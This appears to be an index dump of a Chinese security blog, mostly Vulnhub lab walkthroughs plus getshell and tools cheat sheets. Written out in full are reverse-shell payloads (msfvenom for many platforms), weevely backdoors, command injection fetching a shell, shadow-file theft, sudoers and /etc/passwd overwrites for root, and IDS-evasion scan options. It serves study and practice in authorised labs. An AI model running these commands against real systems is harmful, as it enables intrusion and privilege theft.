\n移动互联工业控制系统特征要素：移动终端、移动应用和无线网络移动互联安全扩展要求提出特殊保护要求，增加的内容包括：无线接入点的物理位置、移动终端管控、移动应用管控、移动应用软件采购、移动应用软件开发  \n工业控制系统工业控制系统特征要素：现场采集/执行、现场控制、过程控制和生产管理工业控制系统信息安全主要思想包括体系：安全防护检测体系、安全态势分析体系、云服务体系  \n","categories":["等保测评/初级考试"],"tags":[]},{"title":"Vulnhub|Questions","url":"/238e957d.html","content":"1.靶机安装后无ip\n使用NAT模式，保证与攻击机kali在同一网段内。\n\n这里配置完了之后发现nmap不到靶机的ip。\n解决办法：  \n1.启动靶机时按shift，进入配置界面，修改配置信息：2.ip a查看网卡信息，可以看到靶机没有成功地被分配到ip，记住网卡名称ens33：3.vim /etc/network/interfaces看一下配置信息用的是哪一个网卡，把它们都改为ens33：/etc/init.d/networking/interfaces重启网卡后，重新启动靶机。\n\n\n\n此时靶机启动后，在攻击机上进行主机扫描时应能扫描到。\n\n2.css加载异常&amp;url重定向\n解决办法：将目标靶机ip地址设定为localhost vi /etc/hosts：  \n\n3.报“403”错误\n解决办法：（若用的VMware）把靶机部署文件中的.mf文件删掉！！\n\n","categories":["渗透测试"],"tags":["Vulnhub"]},{"title":"Vulnhub|symfonos2","url":"/81698da0.html","content":"0.靶机安装\n不再赘述，可看之前的Vulnhub相关文章。  \n\n1.信息收集\n主机扫描nmap扫描nmap -sn 192.168.xxx.0/24靶机开放了21(ftp)、22(ssh)、80(http)、139(netbios-ssn)和445(micrsoft-ds)端口。  \n\n2.(21端口)ftp\n尝试未登录访问site help，找到mod_copy模块未授权调用漏洞  \n\n3.(80端口)web\n访问页面，查看源码后没有发现什么。nikto -h 192.168.xxx.xxx扫一下目录,也没有什么。  \n\n4.(445/139端口)smb\n\n通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。   \n\n查看目标的共享文件夹smbclient -L //192.168.xxx.xxx:连接/anonymous smbclient //192.168.xxx.xxx/anonymous:ls -a查看当前目录下有什么，找到log.txt：cat log.txt查看文件，获得用户名aeolus和共享文件夹anonymous的路径：  \n\n5.getshell\n\n2021-12-03发布的getshell相关文章getshell   \n\n整理一下现在获得的信息：(ftp)mod_copy模块未授权调用漏洞，(smb)一个用户名和共享文件夹的路径。思路：将靶机口令文件passwd和shadow复制到共享文件夹中，再通过共享文件夹获得这两个文件，接着爆破口令。  \n5.1 (ftp)mod_copy模块未授权调用漏洞\n将var/backups/shadow.bak(shadow没有复制权限，故复制备份文件.bak)和/etc/passwd通过ftp复制到/home/aeolus/share中：site cpfr /var/backups/shadow.baksite cpto /home/aeolus/share/shadow.txtsite cpfr /etc/passwdsite cpto /home/aeolus/share/passwd.txt  \n\n5.2 (smb)进入共享文件夹，获取目标文件\nsmbclient //192.168.xxx.xxx/anonymous:保存至本地get shadow.txt get passwd.txt:  \n\n5.3 爆破口令\n使用kali自带的密码字典/usr/share/wordlist/rockyou,txt:使用unshadow passwd.txt shadow.txt &gt; password.txt整合一下两个口令文件：使用Hydra爆破hydra -l aeolus -P /usr/share/wordlist/rockyou,txt 192.168.xxx.xxx ftp,我这里使用Hydra太慢了，换用john。使用john爆破john --wordlist=/usr/share/wordlist/rockyou,txt /root/password.txt：获得用户名和口令aeolus：sergioteamo  \n\n5.4 ssh登录\nssh aeolus@192.168.xxx.xxx登陆后发现没有什么权限。  \n\n5.5 msf用msf查找一下ssh_login的exp search ssh_login,按照show options配置好相关参数：run后拿到了一个系统shell，需要将其升级为meterpreter shell：  \n\nbackground或ctrl+z返回上一层。sessions查看系统shell的session id=1：sessions -u 1升级session 1。sessions看到sessions列表多了一个刚才升级的shell，id=2：session 2使用session 2，成功升级shell：拿到shell之后在系统里转悠了半天，啥也没发现。netstat查看一下开启的端口，会不会有遗漏的地方。发现靶机一直在8080端口监听来自于自己的连接，只能本地访问：  \n\n\n6.内网穿透\n\n这里我理解的也不是很透彻，需要多接触一些实例，下面这两篇文章蛮不错的：  \nhttps://www.linuxprobe.com/ssh-port-forward.html  \nhttps://www.cnblogs.com/f-ck-need-u/p/10482832.html  \n\n这个靶机需要用到的是本地端口转发：对本机9999端口的访问，映射到靶机的8080端口上。a.攻击机kali上直接执行：ssh -N -f -L 999:127.0.0.1:8080 aeolus@192.168.xxx.xxxb.使用已经集成到Metasploit内的portfwd端口转发/重定向工具：portfwd add -l 9999 -r 127.0.0.1 -p 8080输入密码后，在浏览器访问127.0.0.0:9999:访问成功，使用aeolus：sergioteamo登录librenms系统，登陆后浏览了一下也没发现啥。用msfsearch librenms找一下系统的exp，使用exp配置相关参数：成功拿到一个用户cronus的shell。\n\n7.提权\n\n2021-12-01发布的提权相关文章提权  \n\nsudo提权sudo -l：利用mysql提权sudo -u root mysql -e &#39;\\!/bin/bash&#39;：进/root，拿flag：\n\n","categories":["渗透测试"],"tags":["Vulnhub","提权","Metasoploit","内网穿透","smb","ftp"]},{"title":"Vulnhub|Toppo","url":"/e4c5a7f9.html","content":"0.靶机安装\n不再赘述，可看之前的Vulnhub相关文章。  \n\n1.信息收集\n主机扫描nmap扫描nmap -sn 192.168.xxx.0/24靶机开放了22(ssh)、80(http)和111(rpcbind)端口。  \n\n2.(80端口)web安全\nweb访问，查看源代码web目录扫描：nikto -h 192.168.xxx.xxx:访问/admin发现一个密码12345ted123\n\n这种类型密码可以猜测用户名是ted  \n\n访问/css：前端代码访问/img：一些普通图片访问/mail：contact_me.php文件没有暴露有用代码访问/manual：apache2  \n\n3.(22端口)SSH-getshell\n\n2021-12-03发布的getshell相关文章getshell   \n\nssh ted@192.168.xxx.xxx用刚获得的用户名密码尝试登陆，登陆成功。cat /etc/passwd查看用户。以ted身份权限浏览了一下系统，没有发现什么。  \n\n4.提权\n\n2021-12-01发布的提权相关文章提权  \n\n尝试sudo提权sudo -l没有权限。尝试suid提权find / -perm -u=s -type f 2&gt;/dev/null获取可利用信息/usr/bin/python2.7和/usr/bin/mawk：利用mawk提权：mawk &#39;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#39;利用python2.7提权：python -c &#39;import os;os.system(&quot;/bin/sh&quot;)&#39;  \n\n注意这里只能/bin/sh，不能bin/bash  \n\n进/root拿flag.txt:  \n\n","categories":["渗透测试"],"tags":["Vulnhub","提权"]},{"title":"Vulnhub|JIS-CTF-VulnUpload-CTF01","url":"/63d10771.html","content":"0.靶机安装\n不再赘述，可看之前的Vulnhub相关文章。  \n\n1.信息收集\n主机扫描nmap扫描nmap -sn 192.168.xxx.0/24靶机开放了22(ssh)和80(http)端口。  \n\n2.(80端口)web安全\nweb访问，查看源代码一个登陆界面，没有发现什么。web目录扫描：nikto -h 192.168.xxx.xxx:访问/admin_area，查看源码，拿到flag2及账号密码：访问/uploaded_files，没有发现什么。访问/flag，拿到flag1：访问robots.txt，大致看了一下没有其他发现。用/admin_area找到的账户密码登录系统，发现有上传文件的功能。  \n\n3.getshell\n\n2021-12-03发布的getshell相关文章getshell   \n\n验证了一下没有限制上传文件的属性，故思路是一句话木马-上传-蚁剑连接，或者直接用msf生成反弹shell代码-上传-msf监听。这里使用Linux中的工具weevely生成后门-上传-连接后门：  \n\nweevely  \n\n生成后门weevely generate &lt;password&gt; &lt;path&gt;  \n连接后门weevely &lt;URL&gt; &lt;password&gt; [cmd]  \n\n\n生成后门文件hello.php，上传文件：直接使用weevely连接后门，连接成功：cat /etc/passwd查看用户列表：ls -a /var/www/html，查看服务器文件:发现hint.txt,cat查看，获得flag3和提示使用technawi登录：发现flag.txt,cat查看，发现没有权限：grep -r &lt;关键字&gt; &lt;目标查找路径&gt;,按提示查找“technawi”相关文件，找到疑似包含密码的文件：cat /etc/mysql/conf.d/credentials.txt查看目标文件，找到flag4和密码：当前用户没有权限直接su切换用户：用ssh试试，登陆成功，能够成功拿到/var/www/html/flag.txt中的flag5：  \n\n","categories":["渗透测试"],"tags":["Vulnhub","提权","weevely"]},{"title":"Vulnhub|SickOs1.1","url":"/4de57e3c.html","content":"0.靶机安装\n不再赘述，可看之前的Vulnhub相关文章。这个靶机安装时如果用的VMware，记得把.mf文件删掉！3.报“403”错误  \n\n1.信息收集\n主机扫描nmap扫描nmap -sn 192.168.xxx.0/24靶机开放了22(ssh)、8080(http-proxy)和3128(squid-http)端口。8080是closed状态，先不管它。squid-http可以当作一个http代理服务  \n\n2.(80端口)web安全\nweb访问，查看源代码配置浏览器代理：成功访问，没有发现什么。web目录扫描dirb: dirb http://192.168.117.139 -p 192.168.117.139:3128nikto: nikto -h 192.168.117.139 -useproxy 192.168.117.139:3128访问/robots.txt访问/wolfcms浏览了一下系统，有一个下载文件，下载后打开查看，没有发现什么。继续扫一下目录dirb http://192.168.117.139/wolfcms -p 192.168.117.139:3128也没有发现什么，看网上的思路，直接访问/admin //这里不太明白访问的依据是什么访问/wolfcms/admin,自动跳转到后台登陆界面：尝试了一些常规办法，没有找到账户与密码的相关信息，后发现直接a使用弱口令dmin：admin登陆成功。登陆后类似一个博客管理系统。   \n\n3.getshell\n\n2021-12-03发布的getshell相关文章getshell   \n\n\nmsfvenom生成反弹shell代码+填入+metasploit监听\n该系统Pages/Edit Page意思能够直接修改php代码，验证一下：验证成功，使用msfvenom生成反弹shell代码：msfvenom -p php/meterpreter/reverse_tcp lhost=&lt;攻击机ip地址&gt; lport=&lt;攻击机监听端口&gt; -o shell.php粘贴到编辑器并保存生效(注意要与原编辑器的内容组成一个完整的&lt;?php?&gt;结构)：metasploit开启监听：getshell成功，转成交互式shell：  \n\n4.提权\nls -a发现配置文件config.php,cat查看：找到数据库使用的是mysql，数据库名wolf，用户名root，密码john@123：直接用root：john@123这套账户密码su和ssh都登陆失败。cat /etc/passwd查看一些用户列表，发现用户sickos，用它尝试登陆一下：登陆成功，sudo -i切换为root，提权成功。  \n\n\nsudo -i：Linux终端命令下改变用户对命令使用权限的命令。获得的是root用户的环境。  \nsudo -s：执行环境变量中的 SHELL 所指定的 shell，或是 /etc/passwd 里所指定的 shell 。获得的是本身用户的环境。  \n\n\n进入/root，拿flag:  \n\n","categories":["渗透测试"],"tags":["Vulnhub","提权","Metasoploit","反弹shell","Msfvenom"]},{"title":"Vulnhub|SickOs1.2","url":"/d4ec2f86.html","content":"0.靶机安装\n使用NAT模式，保证与攻击机kali在同一网段内。\n\n这里配置完了之后发现nmap不到靶机的ip。\n解决办法：1.靶机安装后无ip  \n\n此时靶机启动后，在攻击机上进行主机扫描时应能扫描到。\n\n1.信息收集\n主机扫描nmap扫描nmap -sn 192.168.xxx.0/24靶机开放了22(ssh)和80(http)端口。  \n\n2.(80端口)web安全\nweb访问，查看源代码打开是一张图片blow.jpg。查看是否隐写，strings &lt;图片所在路径/文件名&gt; 没有发现什么。dirb扫描web目录dirb http://192.168.xxx.xxx //这里用nikto扫不到，不晓得为啥:访问http://192.168.xxx.xxx/test ,找到版本信息:上网搜版本漏洞，没有发现什么。查看/test目录支持的方法：nmap --script http-methods --script-args http-methods.url-path=&#39;/test&#39; 192.168.xxx.xxx  //还有很多其他方法具有潜在风险且可利用的method：验证可用PUT上传文件：  \n\n这里总是失败，报403，后发现是3.报“403”错误   \n\n1.BurpSuite：拦截请求，修改请求头与请求报文：2.nmap nmap 192.168.xxx.xxx -p 80 --script http-put --script-args http-put.url=&#39;/test/&lt;php文件名&gt;&#39;,http-put.file=&quot;&lt;php文件名&gt;&quot;&gt;3.curl curl -T &lt;php文件名&gt; http://192.168.xxx.xxx/test/ \n\ncurl上传出现417错误：需要在curl的参数中加上特定的HTTP Header Expect:，即将Header中Expect的值手动指定为空。  \n\n\n3.getshell\n\n2021-12-03发布的getshell相关文章getshell   \n\nA) 一句话木马+蚁剑+/usr/share/webshells/php/php-reverse-shell.phpPUT一句话木马：蚁剑连接成功：上传kali自带的反弹shell代码/usr/share/webshells/php/php-reverse-shell.php，方便后续操作：修改php-reverse-shell.php：通过蚁剑上传到/test目录下：攻击机开启端口监听nc -nvlp 443，在浏览器访问/test/php-reverse-shell.php。B) msfvenom生成反弹shell代码+PUT/上传+metasploit监听生成反弹shell：msfvenom -p php/meterpreter/reverse_tcp lhost=&lt;攻击机ip&gt; lport=&lt;攻击机监听端口：443&gt; -o shell.phpcurl上传：curl -T &lt;反弹代码所在路径/shell.php&gt; -H &#39;Expect:&#39; &quot;http://192.168.xxx.xxx/test/&quot;metasploit监听443：getshell成功，转为交互式shell：  \n\n4.提权\n\n2021-12-01发布的提权相关文章提权  \n\n尝试sudo提权：需要用户密码-失败。尝试suid提权：没有找到可行文件-失败。尝试在/etc/passwd添加用户：可写文件里没有/etc/passwd-失败。查看/etc/cron*下所含的所有文件ls la /etc/cron*:发现/etc/cron.daily文件下，root使用chkrootkit工具。  \n\nA)直接使用searchsploit chkrootkit查看说明文档 cat usr/share/exploitdb/linux/local/33899.txt按说明文档执行：利用chkrootkit，添加当前用户www-data到sudoers列表中：  \n\n/etc/sudoers 该文件允许特定用户像root用户一样使用各种各样的命令，而不需要root用户的密码。  \n\necho &#39;chmod +w /etc/sudoers &amp;&amp; echo &quot;www-data ALL=(ALL)NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoers&#39; &gt; /tmp/updatesudo -i提权成功:  \n\nsudo -i：Linux终端命令下改变用户对命令使用权限的命令。获得的是root用户的环境。  \nsudo -s：执行环境变量中的 SHELL 所指定的 shell，或是 /etc/passwd 里所指定的 shell 。获得的是本身用户的环境。  \n\n   \n\n\nB)使用msf搜索exp：使用exp需要先获得一个session，重新用msf监听443，获取shell后，background返回上一层，成功获得一个session：使用chkrootkit的exp：提权成功，拿flag：  \n\n\n","categories":["渗透测试"],"tags":["Vulnhub","提权","Metasoploit","反弹shell","Msfvenom","http-methods"]},{"title":"Vulnhub|Os-Hax","url":"/9c45f9e.html","content":"0.靶机安装\n使用NAT模式，保证与攻击机kali在同一网段内。\n\n这里配置完了之后发现nmap不到靶机的ip。\n解决办法：1.靶机安装后无ip  \n\n此时靶机启动后，在攻击机上进行主机扫描时应能扫描到。\n\n1.信息收集\n主机扫描nmap扫描nmap -sn 192.168.xxx.0/24靶机开放了22(ssh)和80(http)端口。  \n\n2.(80端口)web安全\nweb访问，查看源代码dirb扫描web目录dirb http://192.168.xxx.xxx :访问http://192.168.117.135/html 没有什么有用信息:访问http://192.168.117.135/img 发现flaghost.png，打开发现没有明示什么有用的信息：下载下来，进一步查看是否进行了图片隐写strings &lt;文件名&gt;发现疑似密码的字符串：访问http://192.168.117.135/wordpress ：  \n\n页面的css样式没有加载出来，并且点击功能切换页面时，url会重定向到localhost：  \n解决办法：2.css加载异常&amp;url重定向   \n\n使用wpscan扫描:  \n\nwpscan是一款专门针对WordPress安全扫描器  \n\n\n\n\n功能\n命令\n\n\n\n\n扫描安装的插件\nwpscan –url http://192.168.xxx.xxx/wordpress –enumerate p\n\n\n扫描安装的插件的漏洞\nwpscan –url http://192.168.xxx.xxx/wordpress –enumerate vp\n\n\n枚举wordpress的用户\nwpscan –url http://192.168.xxx.xxx/wordpress –enumerate u\n\n\n\n发现一个用户web：结合上面发现的疑似密码字符串passw@45，尝试登陆，登陆失败：尝试取回口令，失败：查阅网上dalao的思路，发现这是一个目录……进入http://192.168.117.135/passw@45 发现flag2以及hostconfigure ：flag2内容是经过brainfuck加密的，解密得到账户密码：登陆后，发现该账户拥有超管权限：  \n\n3.getshell\n\n2021-12-03发布的提权相关文章getshell   \n\n3.1 msfvenom生成反弹shell代码msfvenom -p php/meterpreter/reverse_tcp lhost=&lt;攻击机ip地址&gt; lport=&lt;攻击机监听端口&gt; -o shell.php3.2.1 该系统的/Appearance/theme editor下可直接修改php代码，故可在此填入：将msfvenom生成的反弹shell代码粘贴到某一个php编辑器中（要把首部的‘/*’去掉） ，上传：3.2.2 该系统的/Activity monitor存在Command Injection漏洞，可借此wget 反弹shell代码来反弹shell：  \n\n验证存在Command Injection漏洞：192.168.xxx.xxx|id  \n\n192.168.xxx.xxx|wget &lt;反弹shell所在路径/shell.php&gt;3.3 打开metasploit监听：\n\n注意：此处的lhost与lport必须是攻击机的ip与端口，即与3.1 msfvenom生成反弹shell代码配置的一样   \n\n3.4访问http://192.168.117.135/wordpress,getshell成功：获取交互式shell：python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;切换用户web登录，登陆成功：反思|前面获得一个账户密码的时候就应该尝试ssh，若能登录则无需反弹shell的内容由sh切换为bash：/bin/bash  \n\n/bin/sh与/bin/bash的区别  \n\nsh一般设成bash的软链(symlink)ls -l /bin/sh  \nlrwxrwxrwx 1 root root 4 Sep 14 04:45 /bin/sh -&gt; bash    \n在一般的Linux系统当中（例外如FreeBSD，OpenBSD等），使用sh调用执行脚本相当于打开了bash的POSIX标准模式。  \n也就是说 /bin/sh 相当于 /bin/bash –posix   \n\n\n查看系统用户 cat /etc/passwd:进入/home，有两个用户文件夹：进入/user-a，没有发现什么。进入/web，发现flag3：  \n\n4.提权\n\n2021-12-01发布的提权相关文章提权  \n\n尝试sudo提权：利用awk：sudo /usr/bin/awk &#39;&#123;system(&quot;/bin/bash&quot;)&#125;&#39;提权成功，进入/root寻找最后一个flag：\n\n","categories":["渗透测试"],"tags":["Vulnhub","提权","Metasoploit","反弹shell","Msfvenom"]},{"title":"getshell","url":"/75811fbe.html","content":"获取shell\n1.爆破\n优先使用条件：获得有限的账户池与密码池nmap -p 22 --script=ssh-brute --script-args userdb=&lt;账户池.txt&gt;,passdb=&lt;密码池.txt&gt; &lt;靶机ip&gt;使用实例：Vulnhub|Me and My Girlfriend\n\n2.利用exp\n优先使用条件：获得使用内容的版本信息（a）直接使用searchsploit  searchsploit &lt;内容信息&gt;（b）通过metasoploit  search &lt;内容信息&gt;使用实例：Vulnhub|SickOs1.2  \n\n3.反弹shell\n优先使用条件：3.1 有填入并生效php/jsp代码的交互msfvenom生成反弹shell代码+填入+metasploit监听使用实例：Vulnhub|Os-Hax  \n\nmsfvenom生成反弹shell代码 详见Tools-Msfvenom 反弹shell  \n\n3.2 能够PUT/上传代码（a）msfvenom生成反弹shell代码+PUT/上传+metasploit监听（b）一句话木马+蚁剑+kail自带反弹shell代码(/usr/share/webshells/~)使用实例：Vulnhub|SickOs1.2（c）weevely生成后门代码+PUT/上传+weevely连接后门生成后门 weevely generate &lt;password&gt; &lt;path&gt;连接后门 weevely &lt;URL&gt; &lt;password&gt; [cmd]使用实例：Vulnhub|JIS-CTF-VulnUpload-CTF01  \n\n\n升级交互式shell\n\npython\n\n\nsudo  python -c 'import pty;pty.spawn(\"/bin/sh\")'  //python&lt;3\npython3 -c 'import pty;pty.spawn(\"/bin/sh\")'\n\n\n\n\n待续\n\n","categories":["渗透测试"],"tags":["getshell"]},{"title":"Vulnhub|Os-hackNos","url":"/a8b692c1.html","content":"0.靶机安装\n使用NAT模式，保证与攻击机kali在同一网段内。\n\n这里配置完了之后发现nmap不到靶机的ip。\n解决办法：\n1.启动靶机时按shift，进入配置界面，修改配置信息：2.ip a查看网卡信息，可以看到靶机没有成功地被分配到ip，记住网卡名称ens33：3.vim /etc/network/interfaces看一下配置信息用的是哪一个网卡，把它们都改为ens33：/etc/init.d/networking/interfaces重启网卡后，重新启动靶机。\n\n此时靶机启动后，在攻击机上进行主机扫描时应能扫描到。\n\n\n1.信息收集\n主机扫描nmap扫描nmap -sn 192.168.xxx.0/24靶机开放了22(ssh)和80(http)端口。  \n\n2.(80端口)web安全\nweb访问，查看源代码是一个apache2的默认页面，没有发现什么。dirb扫描web目录dirb http://192.168.xxx.xxx :访问http://192.168.117.134/drupal :该目录是一个内容管理系统。访问http://192.168.117.134/drupal/robots.txt :查看文件CHANGELOG.txt，获得版本信息：  \n\n3.getshell(msf)\n通过metasoploit搜索expsearch drupal：由于攻击目标不在根目录下，故需设置targeturi到对应目录/drupal：获取shell：将其转换成交互式的shell，先查看使用python版本：python&gt;3使用python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;：ls -a查看 /var/www/html 下的文件及文件夹：查看可疑文件alexander.txt：看上去经过base64加密，丢到网上解码器去解码：解码后的内容还是一段加密内容，查了一下发现像是经过brainfuck加密后的密文，继续解码：得到一个用户名和密码james:Hacker@4514，尝试直接su &lt;用户名&gt;切换登录：登陆失败，说明这套账户密码要么是闹你玩儿，要么是没有登陆权限。cat /etc/passwd 查看用户，发现是有james的，进入他的工作目录/home/james看一下，查看可疑文件user.txt:拿到第一个flag.txt    \n\n4. 提权\n\n2021-12-01发布的提权相关文章提权  \n\n尝试sudo提权，因不知道当前用户的密码故不可行：尝试suid提权find / -perm -u=s -type f 2&gt;/dev/null:利用wget：用python3在靶机里搭建一个建议服务器python3 -m http.server 8888(我这里先切换到 /etc 是为了一会获取文件时候省得输入路径，就直接切换到文件所在路径下了)通过攻击机将靶机里的passwd文件通过wget下载出来(上一步如果没有切换到/etc去搭建服务器的话，就要输入完整的文件所在路径)wget http://192.168.117.134:8888/passwd在攻击机上创建一个本地加密用户：openssl passwd -l -salt cyytest 123456\n\n注意此处的用户名必需≥5，否则会失败气死  \n\n将刚创建的加密的本地用户添加到passwd中：&lt;用户名&gt;:&lt;加密后的内容&gt;0:0:0::/root:/bin/bash同样在攻击机上搭建一个服务器：在靶机上将攻击机上的passwd文件通过wget下载并覆盖原有的passwd:通过账户密码 cyytest:123456 登录，成功获取root权限：查看root.txt，拿到第二个flag:    \n\n","categories":["渗透测试"],"tags":["Vulnhub","提权","Metasoploit"]},{"title":"Tools","url":"/2b3bf173.html","content":"nmap\n常用-A依次扫描包含系统探测、版本探测、脚本扫描和跟踪扫描。-p-全端口扫描。-p只扫描指定的端口。-h输出帮助信息。-Pn将所有主机都默认为在线，跳过主机发现。-iflist查看本地路由与接口。  \n目标说明-iL从已有ip列表文件中读取并扫描。-iR+随机选择目标进行扫描。--exclude+ip排除此ip。  \n主机发现-sL列出要扫描的ip。-sn不进行端口扫描。-Pn叫所有的主机都默认为在线，跳过主机发现。（全面、较慢）-PS/PA/PU/PY使用TCP、SYN/ACK、UDP或SCTP协议去发现端口。-PE/PP/PM使用ICMP响应（echo）、时间戳或子网掩码请求来发现探测。-PO使用IP协议的ping。-n不做DNS解析。-R总是做DNS反向解析。--dns-servers指定自定义的DNS服务器。--system-dns使用操作系统的DNS。--traceroute追踪每台主机的跳转路径。  \n扫描技术-sS/sT/sA/sW/sM使用SYN、TCP、全连接Connect()、ACK、Window、Maimon来进行扫描。-sUUDP扫描。-sN/sF/sX使用TCP Null(无flag)、FIN、Xmas（FIN+Push+Urgent）扫描。--scanflags +flags自定义TCP扫描的flags。-sI僵尸机扫描。-sY/sZ使用SCTP协议的INIT/COOKIE-ECHO扫描。-sO进行IP协议扫描。-b &lt;FTP relay host&gt;指定FTP中继主机进行FTP反弹扫描。--send-eth或--send-ip使用原始以太帧或IP数据包发送。  \n端口说明和扫描规则-p-全端口扫描。-p只扫描指定的端口。--exclude-ports不对此端口进行扫描。-F快速模式，扫描比默认端口数量更少的端口。-r有序地扫描端口而不是随机地扫描。--top-ports &lt;number&gt;扫描排名指定的数字前几位的最常用的端口。--port-ratio &lt;ratio&gt;扫描比输入的比例更常用的端口。  \n服务、版本探测-sV探测开启的端口来获取服务、版本信息。-V输出版本号。--version-intensity &lt;level&gt;设置探测服务、版本信息的强度。--version-light强度为2的探测强度。--version-all强度为9的探测强度。--version-trace将扫描的具体过程显示出来。  \n脚本扫描-sC等同于--script=default。--script=&lt;Lua scripts&gt;指定使用Lua脚本进行扫描。--script-args=&lt;n1=v1,[n2=v2,...]&gt;指定脚本的参数。--script-args-file=filename指定提供脚本参数的文件。--script-trace显示全部发送和收到的数据。--script-updatedb更新脚本的数据库。--script-help=&lt;Lua script&gt;显示脚本的相关信息。  \n防火墙、IDS绕过和欺骗--proxies &lt;url1,[url2],...&gt;指定代理服务器进行扫描。--privileged假设用户有全部权限。--unprivileged假设用户缺少原始套接字权限。-f;--mtu &lt;val&gt;设置MTU最大传输单元。-D &lt;诱饵ip1,诱饵ip2,...&gt;&lt;目标ip&gt;或-D &lt;RND:number&gt;&lt;目标ip&gt;指定多个诱饵IP或者使用RND随机生成number个诱饵IP，对目标主机进行IP欺骗。-S &lt;ip&gt;伪造源地址。-e &lt;iface&gt;使用指定的接口。-g或--source-port &lt;portnum&gt;使用指定的源端口。--data &lt;hex string&gt;在发送包的数据字段中追加自定义的十六进制字符串。--data-string &lt;string&gt;在发送报的数据字段中追加自定义的ASCII字符串。--data-length &lt;num&gt;在发送报的数据字段中追加随机的数据。--ip-options &lt;options&gt;使用指定的IP选项发送包。ttl &lt;val&gt;设置TTL值。--spoof-mac &lt;mac address/prefix/vendor name&gt;伪造源MAC地址。--badsum发送伪造TCP/UDP/SCTP校验和Checksum的数据包。  \n\nSQLMAP\n爆数据库名sqlmap -r E:\\Brup_cap\\1.txt --dbs --batchsqlmap -u &lt;url&gt; --cookie=&quot;PHPSESSID=dwqedewfqfrfq;security=low&quot; --dbs //cookie为注入点  \n爆表名sqlmap -r 1.txt -D &lt;database_name&gt; --tables --batch  \n爆字段名sqlmap -r 1.txt -D &lt;database_name&gt; -T &lt;table_name&gt; --columns --batch  \n字段内容sqlmap -r 1.txt -D &lt;database_name&gt; -T &lt;table_name&gt; -C &lt;column1,column2…&gt; --dump --batch  \n试探WAFsqlmap -u &lt;url&gt; --identify-waf --batch  \ntamper脚本sqlmap -u &lt;url&gt; --tamper &lt;模块名&gt;脚本位置：~/sqlmap/tamper  \n\nMsfvenom 反弹shell\nPayLoads ListBinaries Payloads\n#[Linux]  \nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f elf -o shell.elf   \n#[Windows]  \nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f exe -o shell.exe  \n#[Mac]  \nmsfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f macho -o shell.macho  \n\nWeb Payloads\n#[PHP->.php]  \nmsfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -o shell.php  \n#[JAVA->.jar]  \nmsfvenom -p java/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f jar -o shell.jar  \n#[ASP->.asp]  \nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f asp -o shell.asp  \n#[JSP->.jsp]  \nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -o shell.jsp  \n#[JSP->.war]  \nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f war -o shell.war  \n\nScripting Payloads\n#[Python]  \nmsfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f raw -o shell.py  \n#[Bash]  \nmsfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f raw -o shell.sh  \n#[Perl]  \nmsfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f raw -o shell.pl  \n\nShellCode Payloads\n#[Linux Based Shellcode]  \nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f &lt;language>  \n#[Windows Based Shellcode]  \nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f &lt;language>  \n#[Mac Based Shellcode]  \nmsfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f &lt;language>  \n\n监听-getshell\nmsfconsole  \nuse exploit/multi/handler  \nset payload &lt;payload>  \nset lhost &lt;Your IP Address>  \nset lport &lt;Your Port to Connect On>  \nrun  \n这里的触发条件要是实际情况而定，有的是直接访问对应页面，有的是直接在前端对上传文件进行操作而触发。  \n\n\n蚁剑\n数据管理-右键-添加数据  \n\n[URL]要填到.php目录。\n[连接密码]为[“”]内部的参数。  \n\n\nweevely\n生成后门weevely generate &lt;password&gt; &lt;file&gt;  \n连接后门weevely &lt;url&gt; &lt;password&gt; [cmd]  \n[cmd]\n\n\n模块名\n注释\n模块名\n注释\n\n\n\n\n:shell_su\n通过更变使用者来执行shell命令，可以获得root权限来执行命令\n:bruteforce_sql\n可用来猜解数据库密码\n\n\n:shell_sh\n执行 shell 命令\n:file_find\n查找具有给定名称和属性的文件\n\n\n:shell_php\n执行 PHP 命令\n:file_download\n从远程文件系统下载文件\n\n\n:system_extensions\n收集PHP和webserver扩展列表\n:file_check\n获取文件的属性和权限\n\n\n:system_info\n收集系统信息\n:file_touch\n更改文件时间戳\n\n\n:system_procs\n列出正在运行的进程\n:file_cd\n更改当前工作目录\n\n\n:audit_disablefunctionbypass\n使用mod_cgi和.htaccess绕过系统禁用函数的限制\n:file_grep\n打印与多个文件中的模式匹配的行\n\n\n:audit_etcpasswd\n查看/etc/passwd文件\n:file_gzip\n压缩或解压gzip文件\n\n\n:audit_suidsgid\n查找带有SUID或SGID标志的文件\n:file_tar\n压缩或解压tar文件\n\n\n:audit_phpconf\n查看php配置信息\n:file_enum\n检查路径列表的存在和权限\n\n\n:audit_filesystem\n审核文件系统的弱权限(找777权限)\n:file_cp\n复制单个文件\n\n\n:backdoor_reversetcp\n执行反向TCP 